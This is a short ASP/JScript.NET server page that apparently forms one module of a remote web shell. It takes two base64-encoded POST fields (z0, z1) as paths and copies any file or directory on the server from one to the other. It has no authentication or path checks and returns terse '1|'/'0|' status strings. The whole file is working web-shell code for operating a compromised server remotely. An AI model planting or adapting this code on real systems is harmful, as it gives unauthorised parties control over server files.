<%

function base64Decode(str) {
    if (!str || str.Trim() == "")
        return "";

    try {
        var bytes = System.Convert.FromBase64String(str);
        return System.Text.Encoding.UTF8.GetString(bytes);
    } catch(e) { return ""; }
}

function jsonEscape(str) {
    if (!str)
        return "";
    return str.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r\n", "\\n").Replace("\r", "\\n").Replace("\n", "\\n");
}

function copyDirectory(srcDir, dstDir) {
    var dir = new System.IO.DirectoryInfo(srcDir);
    if (!dir.Exists)
        return;

    if (!System.IO.Directory.Exists(dstDir)) {
        System.IO.Directory.CreateDirectory(dstDir);
    }

    var files = dir.GetFiles();
    for (var i = 0; i < files.Length; i++) {
        var temppath = System.IO.Path.Combine(dstDir, files[i].Name);
        files[i].CopyTo(temppath, false);
    }

    var dirs = dir.GetDirectories();
    for (var j = 0; j < dirs.Length; j++) {
        var temppath = System.IO.Path.Combine(dstDir, dirs[j].Name);
        copyDirectory(dirs[j].FullName, temppath);
    }
}

Response.Buffer = true;
Response.ContentType = "text/plain";

var z0 = Request.Form["z0"] ? Request.Form["z0"] + "" : "";
var z1 = Request.Form["z1"] ? Request.Form["z1"] + "" : "";

var srcPath = base64Decode(z0);
var dstPath = base64Decode(z1);

try {
    if (srcPath == "" || dstPath == "") {
        Response.Write("0|Missing parameters.");
    }
    
    else if (!System.IO.File.Exists(srcPath) && !System.IO.Directory.Exists(srcPath)) {
        Response.Write("0|Source does not exist.");
    }
    
    else if (System.IO.File.Exists(dstPath) || System.IO.Directory.Exists(dstPath)) {
        Response.Write("0|Destination already exists.");
    }
    
    else if (System.IO.Directory.Exists(srcPath)) {
        copyDirectory(srcPath, dstPath);
        Response.Write("1|");
    }
    
    else if (System.IO.File.Exists(srcPath)) {
        System.IO.File.Copy(srcPath, dstPath, false);
        Response.Write("1|");
    }
} catch(e) {
    Response.Write("0|Error://" + jsonEscape(e.message));
}

%>